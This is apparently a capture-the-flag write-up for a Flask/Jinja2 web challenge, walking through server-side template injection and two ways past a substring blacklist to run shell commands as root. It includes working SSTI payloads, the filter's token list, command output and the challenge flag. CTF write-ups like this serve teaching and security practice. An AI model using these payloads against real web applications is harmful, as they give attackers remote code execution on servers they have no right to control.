# Ginger Juice Shop (CITRUS STUDIO) — WEB, 350 pts

Target: `http://54.72.82.22:8050` (Werkzeug/3.1.9, Python 3.11.16, Flask + Jinja2)

## Flag

```
safctf{42dd8c3f359acdfc9b4250f4864ffc35}
```

Recovered from the `FLAG` environment variable of the container
(`printenv` via RCE). Also present as `/app/templates/flag.txt`.

## Recon

- `GET /` returns a single-page "CITRUS STUDIO" splash with a form:

  ```html
  <form method="POST" action="/">
    <input type="text" name="name" placeholder="Enter your name" required>
    <input type="submit" value="Submit">
  </form>
  <div class="greeting-container" id="greeting-container" style="display: none;"></div>
  ```

- No JS bundles, no `/robots.txt` / `/sitemap.xml` / `/api` — everything 404s.
  The whole attack surface is the `name` POST field, which is rendered back into
  `<h2>Hello, <NAME>! Did you find the suspects yet?</h2>`.

## Vulnerability — Jinja2 SSTI with a naive blacklist WAF

`POST name={{7*7}}` → `Hello, 49!` confirms server-side template injection.

A substring blacklist rejects any input containing these tokens
(verified by probing each token individually):

```
__   os   config   class   mro   subclasses   eval   exec
__init__   __builtins__   __globals__   __class__   __mro__
__subclasses__   __import__   system
```

Note `__` (the bare double underscore) is rejected on its own, so the usual
`{{config}}` / `{{lipsum.__globals__.os.popen(...)}}` payloads die immediately.

## Bypass

Two independent gaps defeat the filter:

1. **Only the POST body (`name`) is filtered.** Query-string parameters and
   headers are not scanned, so blacklisted substrings can be smuggled in as
   query args and referenced via `request.args`.
2. **Jinja2 honours string escapes**, so `'\x5f\x5fglobals\x5f\x5f'` yields
   `__globals__` without the literal `__` appearing in the body.

Working chain (chain A below):

```jinja
{{(lipsum|attr(request.args.g))[request.args.m]['popen'](request.args.c)|attr('read')()}}
```

with query args `g=__globals__&m=os&c=<shell command>`.

Why it works:
- `lipsum` is a function defined in `jinja2/utils.py`; its `__globals__` is that
  module's globals dict, which contains `os` (verified: keys include `os`).
- `|attr(request.args.g)` == `lipsum.__globals__` (attr is a real Jinja filter;
  `getitem` is **not** — using it raises 500).
- `[...][...]` subscript then reaches `os['popen']`, `|attr('read')()` collects
  stdout.
- `popen` / `read` / `attr` / `request` / `lipsum` are all absent from the
  blacklist.

Equivalent single-shot payload using hex escapes only (no query smuggling):

```jinja
{{lipsum['\x5f\x5fglobals\x5f\x5f']['\x6fs']['popen']('id')|attr('read')()}}
```

## Exploitation

```
$ id
uid=0(root) gid=0(root) groups=0(root)
```

`find / -iname '*flag*'` → `/app/templates/flag.txt`.
`printenv` → `FLAG=safctf{42dd8c3f359acdfc9b4250f4864ffc35}`.

## Reproduce

```bash
python3 solve.py                      # defaults to the challenge URL
python3 solve.py http://host:port
```

`solve.py` proves RCE, enumerates likely flag locations, and prints the flag.
